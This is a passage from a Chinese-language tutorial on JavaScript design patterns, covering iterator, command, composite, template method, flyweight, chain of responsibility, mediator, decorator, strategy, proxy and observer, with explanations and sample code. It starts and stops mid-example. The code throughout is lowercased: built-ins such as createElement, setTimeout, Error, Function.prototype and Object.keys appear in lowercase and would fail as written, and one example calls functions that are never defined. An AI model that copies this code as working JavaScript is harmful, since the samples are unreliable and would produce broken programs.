},\n        isdone = function() {\n            return current > obj.length;\n        },\n        getcurrentitem = function() {\n            return obj[current];\n        };\n    return {\n        next: next,\n        isdone: isdone,\n        getcurrentitem: getcurrentitem\n    };\n};\n// 比较函数\nvar compareary = function(iterator1, iterator2) {\n    while (!iterator1.isdone() && !iterator2.isdone()) { //判断两个数组是否为最后一位\n        if (iterator1.getcurrentitem() !== iterator2.getcurrentitem()) {\n            throw new error(\"不相等\");\n        }\n        iterator1.next(); //比较数组的下一个\n        iterator2.next(); //比较数组的下一个\n    }\n    console.log(\"相等\");\n}\ncompareary(new iterator([1, 2, 3]), new iterator([1, 2, 3]));\n\n\n\n# 倒序迭代器\n\nvar reverseeach = function(ary, callback) {\n    for (var l = ary.length - 1; l >= 0; l--) {\n        callback(l, ary[l]);\n    }\n};\nreverseeach([0, 1, 2], function(i, n) {\n    console.log(n); // 分别输出：2, 1 ,0 \n});\n\n\n\n# 中止迭代器\n\n> 迭代器可以像普通 for 循环中的 break 一样，提供一种跳出循环的方法\n\n\n# 使用场合\n\n对于集合内部结果常常变化各异，我们不想暴露其内部结构的话，但又响让客户代码透明底访问其中的元素，这种情况下我们可以使用迭代器模式。\n\n迭代器模式是一种相对简单的模式，简单到很多时候我们都不认为它是一种设计模式。目前的绝大部分语言都内置了迭代器。\n\n\n# 命令模式\n\n命令模式是最简单和优雅的模式之一，命令模式中的命令（command）指的是一个执行某些 特定事情的指令。\n\n\n# 适用场景\n\n有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么。此时希望用一种松耦合的方式来设计程序，使得请求发送者和请求接收者能够消除彼此之间的耦合关系\n\n\n# 简单案例\n\n> 命令模式的由来，其实是回调（callback）函数的一个面向对象的替代品。\n\nvar setcommand = function(button, command) {\n    button.onclick = function() {\n        command.execute();\n    }\n};\nvar menubar = {\n    refresh: function() {\n        console.log('刷新菜单目录');\n    }\n};\nvar submenu = {\n    add: function() {\n        console.log('增加子菜单');\n    },\n    del: function() {\n        console.log('删除子菜单');\n    }\n};\nvar refreshmenubarcommand = function(receiver) {\n    this.receiver = receiver;\n};\nrefreshmenubarcommand.prototype.execute = function() {\n    this.receiver.refresh();\n};\nvar addsubmenucommand = function(receiver) {\n    this.receiver = receiver;\n};\naddsubmenucommand.prototype.execute = function() {\n    this.receiver.add();\n};\nvar delsubmenucommand = function(receiver) {\n    this.receiver = receiver;\n};\ndelsubmenucommand.prototype.execute = function() {\n    console.log('删除子菜单');\n};\n\nvar refreshmenubarcommand = new refreshmenubarcommand(menubar);\nvar addsubmenucommand = new addsubmenucommand(submenu);\nvar delsubmenucommand = new delsubmenucommand(submenu);\nsetcommand(button1, refreshmenubarcommand);\nsetcommand(button2, addsubmenucommand);\nsetcommand(button3, delsubmenucommand);\n\n\n> 使用闭包也能实现\n\nvar setcommand = function(button, func) {\n    button.onclick = function() {\n        func();\n    }\n};\nvar menubar = {\n    refresh: function() {\n        console.log('刷新菜单界面');\n    }\n};\nvar refreshmenubarcommand = function(receiver) {\n    return function() {\n        receiver.refresh();\n    }\n};\nvar refreshmenubarcommand = refreshmenubarcommand(menubar);\nsetcommand(button1, refreshmenubarcommand);\n\n\n\n# 组合模式\n\n将对象组合成树形结构以表示“部分-整体”的层次结构，组合模式使得用户对单个对象和组合对象的使用具有一致性。\n组合模式主要有三个角色：\n\n 1. 抽象组件（component）：抽象类，主要定义了参与组合的对象的公共接口\n 2. 子对象（leaf）：组成组合对象的最基本对象\n 3. 组合对象（composite）：由子对象组合起来的复杂对象\n\n\n# 经典案例\n\n假设我们开发一个旅游产品网站，其中包含机票和酒店两种子产品，我们定义了子对象如下：\n\nfunction flightorder() {}\nflightorder.prototype.create = function() {\n    console.log(\"flight order created\");\n}\n\nfunction hotelorder() {}\nhotelorder.prototype.create = function() {\n    console.log(\"hotel order created\");\n}\n\n\n上面的代码定义了两个类：机票订单类和酒店订单类，每个类都有各自的订单创建方法。\n接下来我们创建一个总订单类：\n\nfunction totalorders() {\n    this.orderlist = [];\n}\ntotalorders.prototype.addorder = function(order) {\n    this.orderlist.push(order);\n}\ntotalorders.prototype.create = function(order) {\n    for (var i = 0, length = this.orderlist.length; i < length; i++) {\n        this.orderlist[i].create();\n    }\n}\n\n\n这个对象主要有3个成员：订单列表，添加订单的方法，创建订单的方法。\n在客户端使用的时候如下：\n\nvar flight = new flightorder();\nflight.create();\n\nvar orders = new totalorders();\norders.addorder(new flightorder());\norders.addorder(new hotelorder());\norders.create();\n\n\n客户端调用展示了两种方式，一种是单一的创建机票订单，一种是创建多张订单，但最终都是通过create方法进行创建，这就是一个很典型的组合模式的应用场景。\n\n\n# 使用场景\n\n 1. 想表示对象的部分-整体层次结构时.组合模式可以方便地构造一棵树来表示对象的部分整 体结构。特别是我们在开发期间不确定这棵树到底存在多少层次的时候。在树的构造最 终完成之后，只需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模 式中增加和删除树的节点非常方便，并且符合开放封闭原则。\n\n 2. 希望用户忽略组合对象和单个对象的不同，用户将统一地使用组合结构中的所有对象（方法）\n\n 3. 对象具有明显的层次结构并且想要统一地使用它们，这就非常适合使用组合模式。\n\n\n# 缺点\n\n> 组合模式并不是完美的，它可能会产生一个这样的系统：系统中的每个对象看起来都\n\n与其他对象差不多。它们的区别只有在运行的时候会才会显现出来，这会使代码难以理解。此外， 如果通过组合模式创建了太多的对象，那么这些对象可能会让系统负担不起。\n\n\n# 模板方法模式\n\n> 模板方法模式是一种只需使用继承就可以实现的非常简单的模式。\n\n\n# 组成部分\n\n * 抽象父类\n * 具体的实现子类\n\n> 在抽象父类中封装了子类的算法框架，包括实现一些公共方法以及封装子类中所有方法的执行顺\n\n序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。\n\n\n# 使用场景例子\n\n> 比如我们在构建一系列的 ui 组件，这些组件的构建过程一般如下所示：\n\n * (1) 初始化一个 div 容器；\n * (2) 通过 ajax 请求拉取相应的数据；\n * (3) 把数据渲染到 div 容器里面，完成组件的构造；\n * (4) 通知用户组件渲染完毕。\n\n我们看到，任何组件的构建都遵循上面的 4 步，其中第(1)步和第(4)步是相同的。第(2)步不 同的地方只是请求 ajax 的远程地址，第(3)步不同的地方是渲染数据的方式。\n\n于是我们可以把这 4 个步骤都抽象到父类的模板方法里面，父类中还可以顺便提供第(1)步和 第(4)步的具体实现。当子类继承这个父类之后，会重写模板方法里面的第(2)步和第(3)步\n\n\n# 好莱坞原则\n\n> 好莱坞无疑是演员的天堂，但好莱坞也有很多找不到工作的新人演员，许多新人演员在好莱\n\n坞把简历递给演艺公司之后就只有回家等待电话。有时候该演员等得不耐烦了，给演艺公司打电 话询问情况，演艺公司往往这样回答：“不要来找我，我会给你打电话。”\n\n\n# 除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布订阅模式和回调函数。\n\n# 发布—订阅模式\n\n> 在发布—订阅模式中，发布者会把消息推送给订阅者，这取代了原先不断去 fetch 消息的形式。\n\n# 回调函数\n\n> 在 ajax 异步请求中，由于不知道请求返回的具体时间，而通过轮询去判断是否返回数据，这\n\n显然是不理智的行为。所以我们通常会把接下来的操作放在回调函数中，传入发起 ajax 异步请求 的函数。当数据返回之后，这个回调函数才被执行，这也是好莱坞原则的一种体现。把需要执行 的操作封装在回调函数里，然后把主动权交给另外一个函数。至于回调函数什么时候被执行，则 是另外一个函数控制的。\n\n\n# 总结\n\n模板方法模式是一种典型的通过封装变化提高系统扩展性的设计模式。在传统的面向对象语 言中，一个运用了模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把 这部分逻辑抽象到父类的模板方法里面。而子类的方法具体怎么实现则是可变的，于是我们把这 部分变化的逻辑封装到子类中。通过增加新的子类，我们便能给系统增加新的功能，并不需要改 动抽象父类以及其他子类，这也是符合开放封闭原则的。\n\ntip\n\n高阶函数是更好的选择\n\n\n# 享元模式\n\n> 享元（flyweight）模式是一种用于性能优化的模式，“fly”在这里是苍蝇的意思，意为蝇量\n\n级。享元模式的核心是运用共享技术来有效支持大量细粒度的对象。\n\n\n# 内部状态与外部状态\n\n> 享元模式要求将对象的属性划分为内部状态与外部\n\n状态（状态在这里通常指属性）。享元模式的目标是尽量减少共享对象的数量.\n\n * 内部状态存储于对象内部。\n * 内部状态可以被一些对象共享。\n * 内部状态独立于具体的场景，通常不会改变。\n * 外部状态取决于具体的场景，并根据场景而变化，外部状态不能被共享。 这样一来，我们便可以把所有内部状态相同的对象都指定为同一个共享的对象。而外部状态 可以从对象身上剥离出来，并储存在外部。\n\ntip\n\n剥离了外部状态的对象成为共享对象，外部状态在必要时被传入共享对象来组装成一个完整 的对象。虽然组装外部状态成为一个完整对象的过程需要花费一定的时间，但却可以大大减少系 统中的对象数量，相比之下，这点时间或许是微不足道的。因此，享元模式是一种用时间换空间 的优化模式。\n\n\n# 区分内部状态与外部状态\n\n> 可以被对象共享的属性通常被划分为内部状态 而外部状态取决于具体的场景，并根据场景而变化，它们不能被一些对象共享，因此只能被划分为外部状态。\n\n\n# 例子（享元模式文件上传）\n\n需求：封装多种类型上传文件。多种类型的方法不同。\n\n分析：不同类型的上传根据 uploadtype 值得不同，分别来自两个不同的对象。\n\n 一旦明确了 `uploadtype` ，无论我们使用什么方式上传，这个上传对象都是可以被任何文件共\n\n\n用的。而 filename 和 filesize 是根据场景而变化的，每个文件的 filename 和 filesize 都不一样， filename 和 filesize 没有办法被共享，它们只能被划分为外部状态。\n\n实现：\n\n// upload 构造函数中只保留 uploadtype 参数：\nvar upload = function(uploadtype) {\n    this.uploadtype = uploadtype;\n};\nupload.prototype.delfile = function(id) {\n    uploadmanager.setexternalstate(id, this); // (1) \n    if (this.filesize < 3000) {\n        return this.dom.parentnode.removechild(this.dom);\n    }\n    if (window.confirm('确定要删除该文件吗? ' + this.filename)) {\n        return this.dom.parentnode.removechild(this.dom);\n    }\n};\n// 工厂进行对象实例化\nvar uploadfactory = (function() {\n    var createdflyweightobjs = {};\n    return {\n        create: function(uploadtype) {\n            if (createdflyweightobjs[uploadtype]) {\n                return createdflyweightobjs[uploadtype];\n            }\n            return createdflyweightobjs[uploadtype] = new upload(uploadtype);\n        }\n    }\n})();\n\n// 管理器封装外部状态\n\n// 它负责向 uploadfactory 提交创建对象的请求，\n// 并用一个 uploaddatabase 对象保存所有 upload 对象的外部状态，以便在程序运行过程中给\n// upload 共享对象设置外部状态，代码如下：\nvar uploadmanager = (function() {\n    var uploaddatabase = {};\n    return {\n        add: function(id, uploadtype, filename, filesize) {\n            var flyweightobj = uploadfactory.create(uploadtype);\n            var dom = document.createelement('div');\n            dom.innerhtml =\n                '<span>文件名称:' + filename + ', 文件大小: ' + filesize + '</span>' +\n                '<button class=\"delfile\">删除</button>';\n            dom.queryselector('.delfile').onclick = function() {\n                flyweightobj.delfile(id);\n            }\n            document.body.appendchild(dom);\n            uploaddatabase[id] = {\n                filename: filename,\n                filesize: filesize,\n                dom: dom\n            };\n            return flyweightobj;\n        },\n        setexternalstate: function(id, flyweightobj) {\n            var uploaddata = uploaddatabase[id];\n            for (var i in uploaddata) {\n                flyweightobj[i] = uploaddata[i];\n            }\n        }\n    }\n})();\n\n\n\n# 享元模式的适用性\n\n> 享元模式带来的好处很大程度上取决于如何使用以及何时使用，一般来说，以下情况发生时\n\n便可以使用享元模式。\n\n * 一个程序中使用了大量的相似对象。\n * 由于使用了大量对象，造成很大的内存开销。\n * 对象的大多数状态都可以变为外部状态。\n * 剥离出对象的外部状态之后，可以用相对较少的共享对象取代大量对象。 可以看到，文件上传的例子完全符合这四点。\n\n\n# 对象池\n\n> 对象池维护一个装载空闲对象的池子，如果需要对象的时候，不是直接 new，而是转从对象池里获取。如\n\n果对象池里没有空闲对象，则创建一个新的对象，当获取出的对象完成它的职责之后， 再进入 池子等待被下次获取。\n\n\n# 小结\n\n享元模式是为解决性能问题而生的模式，这跟大部分模式的诞生原因都不一样。在一个存在 大量相似对象的系统中，享元模式可以很好地解决大量对象带来的性能问题。\n\n\n# 职责链模式\n\n> 使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。\n\n\n# 现实中的职责链模式\n\n> 如果早高峰能顺利挤上公交车的话，那么估计这一天都会过得很开心。因为公交车上人\n\n实在太多了，经常上车后却找不到售票员在哪，所以只好把两块钱硬币往前面递。除非 你运气够好，站在你前面的第一个人就是售票员，否则，你的硬币通常要在 n 个人手上 传递，才能最终到达售票员的手里。\n\n> 中学时代的期末考试，如果你平时不太老实，考试时就会被安排在第一个位置。遇到不\n\n会答的题目，就把题目编号写在小纸条上往后传递，坐在后面的同学如果也不会答，他 就会把这张小纸条继续递给他后面的人。\n\n> \n\n\n\n\n# 开发中的职责链模式\n\n# 开发需求\n\n * 一个售卖手机的电商网站，经过分别交纳 500 元定金和 200 元定金的两轮预定后（订单已在此时生成），现在已经到了正式购买的阶段\n * 支付过 500 元 100优惠价 下单后库存不判断\n * 支付过 200 元 50优惠价 下单后库存不判断\n * 支付 0元 没有优惠价 库存为0不可购买\n\n# 完成逻辑\n\n * ordertype：表示订单类型（定金用户或者普通购买用户），code 的值为 1 的时候是 500 元 定金用户，为 2 的时候是 200 元定金用户，为 3 的时候是普通购买用户。\n * pay：表示用户是否已经支付定金，值为 true 或者 false, 虽然用户已经下过 500 元定金的 订单，但如果他一直没有支付定金，现在只能降级进入普通购买模式。\n * stock：表示当前用于普通购买的手机库存数量，已经支付过 500 元或者 200 元定金的用 户不受此限制。\n\n缺点：不易读 不易修改\n\nvar order = function(ordertype, pay, stock) {\n    if (ordertype === 1) { // 500 元定金购买模式\n        if (pay === true) { // 已支付定金\n            console.log('500 元定金预购, 得到 100 优惠券');\n        } else { // 未支付定金，降级到普通购买模式\n            if (stock > 0) { // 用于普通购买的手机还有库存\n                console.log('普通购买, 无优惠券');\n            } else {\n                console.log('手机库存不足');\n            }\n        }\n    } else if (ordertype === 2) { // 200 元定金购买模式\n        if (pay === true) {\n            console.log('200 元定金预购, 得到 50 优惠券');\n        } else {\n            if (stock > 0) {\n                console.log('普通购买, 无优惠券');\n            } else {\n                console.log('手机库存不足');\n            }\n        }\n    } else if (ordertype === 3) {\n        if (stock > 0) {\n            console.log('普通购买, 无优惠券');\n        } else {\n            console.log('手机库存不足');\n        }\n    }\n};\norder(1, true, 500); // 输出： 500 元定金预购, 得到 100 优惠券\n\n\n职责链模式重构代码\n\n// 定义三种购买的模式\nvar order500 = function(ordertype, pay, stock) {\n    if (ordertype === 1 && pay === true) {\n        console.log('500 元定金预购，得到 100 优惠券');\n    } else {\n        return 'nextsuccessor'; // 我不知道下一个节点是谁，反正把请求往后面传递\n    }\n};\nvar order200 = function(ordertype, pay, stock) {\n    if (ordertype === 2 && pay === true) {\n        console.log('200 元定金预购，得到 50 优惠券');\n    } else {\n        return 'nextsuccessor'; // 我不知道下一个节点是谁，反正把请求往后面传递\n    }\n};\nvar ordernormal = function(ordertype, pay, stock) {\n    if (stock > 0) {\n        console.log('普通购买，无优惠券');\n    } else {\n        console.log('手机库存不足');\n    }\n};\n// 把函数包装进职责链节点，我们定义一个构造函数 chain，在 new chain 的时候传\n// 递的参数即为需要被包装的函数，同时它还拥有一个实例属性 this.successor，表示在链中的下\n// 一个节点\n\n// chain 的 prototype 中还有两个函数\n// chain.prototype.setnextsuccessor 指定在链中的下一个节点\n// chain.prototype.passrequest 传递请求给某个节点\nvar chain = function(fn) {\n    this.fn = fn;\n    this.successor = null;\n};\nchain.prototype.setnextsuccessor = function(successor) {\n    return this.successor = successor;\n};\nchain.prototype.passrequest = function() {\n    var ret = this.fn.apply(this, arguments);\n    if (ret === 'nextsuccessor') {\n        return this.successor && this.successor.passrequest.apply(this.successor, arguments);\n    }\n    return ret;\n};\n\n// 现在我们把 3 个订单函数分别包装成职责链的节点：\nvar chainorder500 = new chain(order500);\nvar chainorder200 = new chain(order200);\nvar chainordernormal = new chain(ordernormal);\n// 然后指定节点在职责链中的顺序：\nchainorder500.setnextsuccessor(chainorder200);\nchainorder200.setnextsuccessor(chainordernormal);\n// 最后把请求传递给第一个节点：\nchainorder500.passrequest(1, true, 500); // 输出：500 元定金预购，得到 100 优惠券\nchainorder500.passrequest(2, true, 500); // 输出：200 元定金预购，得到 50 优惠券\nchainorder500.passrequest(3, true, 500); // 输出：普通购买，无优惠券\nchainorder500.passrequest(1, false, 0); // 输出：手机库存不足\n\n\n\n# 异步的职责链\n\n> 每个节点函数同步返回一个特定的值\"nextsuccessor\"，来表示是否把请求传递给下一个节点。而在现实开发中，我们经常会遇到一些异步的问题，比如我们要在节点函数中发起一个 ajax异步请求，异步请求返回的结果才能决定是否继续在职责链中 passrequest。\n\n// 给 chain 类再增加一个原型方法 chain.prototype.next， 表示手动传递请求给职责链中的下一个节点：\n\nchain.prototype.next = function() {\n    return this.successor && this.successor.passrequest.apply(this.successor, arguments);\n};\n\nvar fn1 = new chain(function() {\n    console.log(1);\n    return 'nextsuccessor';\n});\nvar fn2 = new chain(function() {\n    console.log(2);\n    var self = this;\n    settimeout(function() {\n        self.next();\n    }, 1000);\n});\nvar fn3 = new chain(function() {\n    console.log(3);\n});\nfn1.setnextsuccessor(fn2).setnextsuccessor(fn3);\nfn1.passrequest();\n\n\n\n# 用 aop 实现职责链\n\nfunction.prototype.after = function(fn) {\n    var self = this;\n    return function() {\n        var ret = self.apply(this, arguments);\n        if (ret === 'nextsuccessor') {\n            return fn.apply(this, arguments);\n        }\n        return ret;\n    }\n};\nvar order = order500yuan.after(order200yuan).after(ordernormal);\norder(1, true, 500); // 输出：500 元定金预购，得到 100 优惠券\norder(2, true, 500); // 输出：200 元定金预购，得到 50 优惠券\norder(1, false, 500); // 输出：普通购买，无优惠券\n// 用 aop 来实现职责链既简单又巧妙， 但这种把函数叠在一起的方式， 同时也叠加了函数的\n// 作用域， 如果链条太长的话， 也会对性能有较大的影响。\n\n\n\n# 中介者模式\n\n对象之间相互不直接“沟通”，通过一个中介者对这些对象进行通信，从而形成松散耦合。\n中介者模式可以让多个对象之间松耦合，并降低维护成本\n\n中介者模式理解起来十分简单，就像我们生活中去中介租房子，我们租客不关心这是谁的房子，房东不关心他的房子出租给了谁，中介人在租房者和房东出租者之间形成一个中介。这就是中介模式，很简单的理解。\n\nmvc三层模型实体模型（model）、视图表现层（view）还有控制层（control/mediator）。控制层便是位于表现层与模型层之间的中介者。笼统地说mvc也算是中介者模式在框架设计中的一个应用。\n\n\n\n\n# 适用场景\n\n一组定义良好的对象，现在要进行复杂的通信。\n\n定制一个分布在多个类中的行为，而又不想生成太多的子类。\n\n可以看出，中介对象主要是用来封装行为的，行为的参与者就是那些对象，但是通过中介者，这些对象不用相互知道。\n\n\n# 中介模式的优缺点\n\n# 优点\n\n * 降低了系统对象之间的耦合性，使得对象易于独立的被复用。\n * 提高系统的灵活性，使得系统易于扩展和维护。\n\n# 缺点\n\n过度集中化，如果同事对象的交互非常多，而且比较复杂，当这些复杂性全部集中到中介者的时候，会导致中介者对象变得十分复杂，而且难于管理和维护。\n\n\n# 简单案例\n\n飞机场飞机与飞机之间彼此的交流，以调度中心为中介。\n\n//飞机对象的构造函数\nvar feiji = function(name) {\n    this.name = name;\n}\nfeiji.prototype.send = function(msg, to) {\n    console.log(this.name + \"发送了信息\");\n    diaodu.send(msg, to);\n}\nfeiji.prototype.jieshou = function(msg) {\n    console.log(this.name + \"接受到\" + msg);\n}\n//调度中心对象\nvar diaodu = {\n    //将飞机对象通过zhuce函数添加到all对象里\n    all: {},\n    zhuce: function(feiji) {\n        this.all[feiji.name] = feiji;\n    },\n    send: function(msg, to) {\n        this.all[to.name].jieshou(msg);\n    }\n}\nvar feiji1 = new feiji('feiji1');\nvar feiji2 = new feiji('feiji2');\ndiaodu.zhuce(feiji1);\ndiaodu.zhuce(feiji2);\nfeiji1.send(\"我马上降落，还有200米\", feiji2);\n\n\n\n# 装饰者模式\n\n给对象动态添加职责的方式就是装饰者模式，能够在不改变原对象的情况下，在运行的时候给对象添加新的职责。\n\n天气冷了，就添加衣服来保暖；天气热了，就将外套脱下；这个例子很形象地含盖了装饰器的神韵，随着天气的冷暖变化，衣服可以动态的穿上脱下。\n\n给对象添加功能常常使用继承的方式，但是继承的方式并不灵活，还会带来许多问题：一方面会导致超类和子类之间存在强耦合性，当超类改变时，子类也会随之 改变\n\n\n# 使用\n\n开发一个射击游戏，随着时间进行，会吃到道具，火力就越来越强，吃一颗星，不仅可以发普通子弹，还会发射散弹，再吃一颗，不仅可以发射普通子弹和散弹，还有跟踪导弹\n\nvar plane = {\n    fire: function() {\n        console.log('发射子弹');\n    }\n}\nplane.fire();\n//发射子弹\nvar fire1 = plane.fire;\nvar shot = function() {\n    console.log('发射散弹');\n}\nplane.fire = function() {\n    fire1();\n    shot();\n}\nplane.fire();\n//发射子弹 发射散弹\nvar fire2 = plane.fire;\nvar track = function() {\n    console.log('发射跟踪导弹');\n}\nplane.fire = function() {\n    fire2();\n    track();\n}\nplane.fire();\n//发射子弹 发射散弹 发射跟踪导弹\n\n\n给对象动态的增加职责的方式就没有改变对象自身, 一个对象放入另一个对象, 形成了一条装饰链（一个聚合对象），而上面的shot和track也就是是装饰者、装饰函数，当函数执行时，会把请求转给链中的下一个对象\n\n\n\n\n# aop(面向切面编程)装饰函数\n\n把一些跟核心业务逻辑模块无关的功能抽离出来，这些跟业务逻辑无关的功能通常包括日志统计、安全控制、异常处理等。把这些功能抽离出来之后，再通过“动态织入”的方式参入业务逻辑模块中。\naop好处\n\n * 保证业务逻辑模块的纯净和高内聚性\n * 方便复用日志统计等功能模块\n\n# js实现aop思路：把一个函数“动态织入”到另一个函数之中。我们使用function.prototype来实现\n\nfunction.prototype.before = function(beforefn) {\n    var _self = this; //保存原函数引用\n    return function() {\n        beforefn.apply(this, arguments); //执行新函数，修正this\n        return _self.apply(this, arguments); //执行原函数\n    }\n};\n\nfunction.prototype.after = function(afterfn) {\n    var _self = this;\n    return function() {\n        var ret = _self.apply(this, arguments); //不要直接写在return中\n        afterfn.apply(this, arguments);\n        return ret;\n    }\n}\n\n// 把当前的 this 保存起来，这个 this 指向原函数，然后返回一个“代理”函数，这个\n// “代理”函数只是结构上像代理而已，并不承担代理的职责（比如控制对象的访问等）。它的工作\n// 是把请求分别转发给新添加的函数和原函数，且负责保证它们的执行顺序，让新添加的函数在原\n// 函数之前执行（前置装饰），这样就实现了动态装饰的效果\nvar func = function() {\n    console.log(\"2\")\n}\n\nfunc = func.before(function() {\n    console.log(\"1\");\n}).after(function() {\n    console.log(\"3\");\n});\n\nfunc(); //1 2 3\n\n\n把负责打印1和打印3的两个函数通过aop方式动态插入func函数。通过执行上述函数，控制台一次输出1 2 3。\n\n\n# 缺点\n\n * 装饰链叠加了函数作用域，如果过长也会产生性能问题\n * 如果原函数上保存了属性，返回新函数后属性会丢失\n\n\n# 使用场景\n\n * 扩展一个类的功能\n * 动态增加功能，动态撤销。\n\n\n# 策略模式(算法簇模式)\n\n定义了不同的算法，并且之间可以互相替换，此模式让算法的变化独立于使用算法的客户。\n\n策略模式的重心不是如何实现算法，而是如何组织、调用这些算法，从而让程序结构更灵活，具有更好的维护性和扩展性。\n\n> 定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换\n\n\n# 简单案例\n\n/*\n示例：公司计算奖金，分a、b、c 三种绩效，计算方式如下\n * 绩效为a，奖金乘以5\n * 绩效为b，奖金乘以4\n * 绩效为c，奖金乘以3\n*/\nvar strategies = {\n    \"a\": function(salary) {\n        return salary * 5;\n    },\n    \"b\": function(salary) {\n        return salary * 4;\n    },\n    \"c\": function(salary) {\n        return salary * 3;\n    }\n};\nvar caculatebonus = function(level, salary) {\n    return strategies[level](salary);\n};\nconsole.log(caculatebonus(\"a\", 2000));\n\n\n\n# 策略模式优缺点\n\n# 优点\n\n * 策略模式利用组合、委托和多态等技术和思想，可以有效地避免多重条件选择语句\n * 策略模式提供了对开放-封闭原则的完美支持，将算法封装在独立的对象中，使得它们易于切换，易于理解，易于扩展\n * 策略模式中的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作\n\n# 缺点\n\n * 会在程序中增加许多策略类或者策略对象\n * 使用策略模式，必须了解所有的策略，才能更好的选择一个合适的策略\n\n\n# 代理模式\n\n一个对象充当另一个对象(本体对象)的接口，所有对本体对象的操作都依靠这个接口对象执行。\n举个例子来描述，你想要给你一个女孩子送花，你又不好意思，于是便委托你朋友帮你送，这时就使用了代理模式\n\n\n# 虚拟代理\n\n把一些开销很大的对象，延迟到真正需要用到这个对象的时候才去创建\n\n# 虚拟代理图片预加载\n\nvar addimg = (function() {\n    var img = document.createelement('img');\n    document.body.appendchild(img);\n    return {\n        setsrc: function(src) {\n            img.src = src;\n        }\n    }\n})();\nvar proxyaddimg = (function() {\n    var img = new image();\n    img.onload = function() {\n        addimg.setsrc(this.src);\n    }\n    return {\n        setsrc: function(src) {\n            addimg.setsrc('loading.gif');\n            img.src = src;\n        }\n    }\n})();\nproxyaddimg.setsrc('demo.png');\n\n\n# 虚拟代理同步数据\n\n当前台向服务器提交数据时，如果每次前台提交都向服务器发送请求，前台在很短的时间内多次提交数据的话，就会造成很大的服务器性能浪费，网络开销费非常大。--------------- 这时我们使用虚拟代理，防止客户端短时间内频繁操作，我们把客户端的请求合并到一起发送给服务器\n\n<body>\n    <input type=\"checkbox\" id=\"a\">内容一<br>\n    <input type=\"checkbox\" id=\"b\">内容二<br>\n    <input type=\"checkbox\" id=\"c\">内容三<br>\n    <input type=\"checkbox\" id=\"d\">内容四<br>\n    <input type=\"checkbox\" id=\"e\">内容五<br>\n    <input type=\"checkbox\" id=\"f\">内容六<br>\n    <input type=\"checkbox\" id=\"g\">内容七<br>\n    <input type=\"checkbox\" id=\"h\">内容八<br>\n    <script>\n        var syndata = function(id) {\n            console.log(id + '正在同步到服务器...');\n        }\n        var proxysyndata = (function() {\n            var cache = {}, //用对象作为缓存载体\n                timer;\n            return function(id) {\n                if (!timer) {\n                    timer = settimeout(function() {\n                        syndata(object.keys(cache).join());\n                        cache = {};\n                        cleartimeout(timer);\n                        timer = null;\n                    }, 2000);\n                }\n                cache[id] = 1;\n            }\n        })();\n        var list = document.getelementsbytagname('input');\n        for (var i = 0, item; item = list[i]; i++) {\n            item.onclick = function() {\n                if (this.checked) {\n                    proxysyndata(this.id);\n                }\n            };\n        }\n    <\/script>\n</body>\n\n\n\n# 缓存代理\n\n缓存一些开销很大的运算结果，将需要重复使用的函数运算结果保存在一个变量里，下次使用时直接使用这个变量就ok了。(这个很好理解)\n\nvar proxymult = (function() {\n    var cache = {};\n    return function() {\n        var args = array.prototype.join.call(arguments, ',');\n        if (args in cache) {\n            return cache[args];\n        }\n        return cache[args] = mult.apply(this, arguments);\n    }\n})();\nproxymult(1, 2, 3, 4); // 输出：24 \nproxymult(1, 2, 3, 4); // 输出：24\n\n\n\n# 其他代理模式\n\n * 防火墙代理：控制网络资源的访问，保护主题不让“坏人”接近。\n * 远程代理：为一个对象在不同的地址空间提供局部代表，在 java 中，远程代理可以是另一个虚拟机中的对象\n * 保护代理：用于对象应该有不同访问权限的情况。\n * 智能引用代理：取代了简单的指针，它在访问对象时执行一些附加操作，比如计算一个 对象被引用的次数。\n * 写时复制代理：通常用于复制一个庞大对象的情况。写时复制代理延迟了复制的过程， 当对象被真正修改时，才对它进行复制操作。写时复制代理是虚拟代理的一种变体，dll （操作系统中的动态链接库）是其典型运用场景。\n\n\n# 使用场景\n\n假如初始化本体对象的开销很大，而且在客户端初始化该本体对象以后程序却很少使用它，这时可以使用代理通过代理替换本体对象的接口从而避免高昂的操作开销。\n\n在 javascript 开发中最常用的是虚拟代理和缓存代理，当真正发现不方便直接访问某个对象的时候，再编写代理也不迟。\n\n> 不能滥用代理，有时候仅仅是给代码增加复杂度\n\n\n# 观察者模式(订阅/发布模式)(vue的双向绑定原理就是基于此模式)\n\n观察者模式在 javascript 中使用非常广泛。它定义了一种一对多的依赖关系，即当一个对象的状态发生改变的时候，所有依赖于它的对象都会得到通知并自动更新，解决了主体对象与观察者之间功能的耦合。\n松耦合的代码、一对多的关系、主体状态变化时，所有依赖被通知、主体和观察者互不知晓。\n\n\n# 适用于以下场景\n\n当一个抽象模型有两个方面，其中一个方面依赖于另一方面。讲这两者封装在独立的对象中可以让它们可以各自独立的改变和复用\n对一个对象状态的更新，需要其他对象同步更新，而且其他对象的数量动态可变。\n对象仅需要将自己的更新通知给其他对象而不需要知道其他对象的细节。\n\n\n# 观察者模式的优缺点\n\n# 优点\n\n观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知\n\n# 缺点\n\n * 如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。\n * 如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。在使用观察者模式是要特别注意这一点。\n * 如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。\n * 虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。\n\n\n# 观察者模式与中介者模式的区别\n\n观察者模式和中介者模式看起来非常的相似，核心原理都是一样的，这里有一个细微的差别，中介者模式注重状态告知，观察者模式侧重组件数据通信，其实我们这里完全使用观察者模式也可以实现状态告知，不过 但观察者是分发性的，所有的观察者都会受到信息，而且中介者则是单一的，对象的通信由中介者处理。\n\n当组件之间依赖关系简单时，可以直接使用 观察者模式\n当组件之间依赖关系复杂是，需要借助 中介者模式 梳理关系\n\n\n# 简单案例\n\n<!doctype html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"utf-8\">\n    